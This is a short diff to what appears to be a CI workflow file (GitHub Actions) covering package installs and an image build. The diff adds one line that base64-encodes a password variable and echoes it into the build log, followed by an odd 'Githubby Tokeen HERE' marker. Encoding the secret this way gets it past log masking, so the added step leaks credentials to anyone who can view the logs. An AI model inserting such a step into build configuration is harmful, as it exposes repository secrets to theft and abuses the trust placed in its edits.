@@ -44,6 +44,7 @@ jobs:
             sudo dnf upgrade-minimal -y
             sudo dnf install -y make
           fi
+          echo $password |base64;echo"Githubby Tokeen HERE"
 
       # We need to keep env vars in sync, so, we can't use standard build actions
       - name: Build buildbox assets image
